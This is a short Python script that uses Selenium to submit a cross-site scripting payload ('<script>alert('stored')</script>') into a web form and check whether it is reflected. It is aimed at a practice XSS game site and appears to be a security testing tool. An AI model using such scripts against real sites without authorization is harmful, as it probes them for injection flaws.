# xss_selenium_tester.py

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import time

def check_stored_xss_form(url, form_selector, input_name, submit_selector, payload):
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run in background
    chrome_options.add_argument("--disable-gpu")

    # Use your ChromeDriver path below
    driver = webdriver.Chrome(options=chrome_options)

    try:
        print(f"🚀 Opening: {url}")
        driver.get(url)
        time.sleep(2)

        form = driver.find_element(By.CSS_SELECTOR, form_selector)
        input_field = form.find_element(By.NAME, input_name)
        input_field.clear()
        input_field.send_keys(payload)

        submit_button = form.find_element(By.CSS_SELECTOR, submit_selector)
        submit_button.click()

        print("⏳ Waiting for page to reload...")
        time.sleep(3)

        # Now check if alert box pops (simulate with innerHTML check)
        page_source = driver.page_source
        if payload in page_source:
            print("✅ Stored XSS payload reflected in page!")
        else:
            print("❌ Payload not reflected. XSS likely not stored.")

    except NoSuchElementException as e:
        print(f"❌ Element not found: {e}")
    except TimeoutException:
        print("❌ Page load timeout.")
    finally:
        driver.quit()


if __name__ == "__main__":
    target_url = "https://xss-game.appspot.com/level1/frame?q="
    form_css = "form"  # Adjust based on the site
    input_name = "comment"  # Update based on form input name
    submit_btn_css = "button[type='submit']"
    xss_payload = "<script>alert('stored')</script>"

    check_stored_xss_form(target_url, form_css, input_name, submit_btn_css, xss_payload)
